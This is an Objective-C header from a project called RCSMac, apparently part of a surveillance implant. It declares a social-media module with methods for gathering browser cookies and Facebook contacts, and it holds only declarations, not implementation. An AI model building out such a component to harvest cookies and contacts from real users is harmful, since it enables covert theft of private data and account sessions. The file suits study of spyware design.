//
//  __m_Social_Module.h
//  RCSMac
//
//  Created by guido on 3/22/13.
//
//

#import <Foundation/Foundation.h>
#import "__m_Social_Facebook.h"
#import "social.h"

@interface __m_Social_Module : NSObject
{
    __m_Social_Facebook *modFacebook;
}
- (void) socialLoop: (id)useLess;
- (NSArray *)getCookies;
- (bool) socialGetContacts;
@end
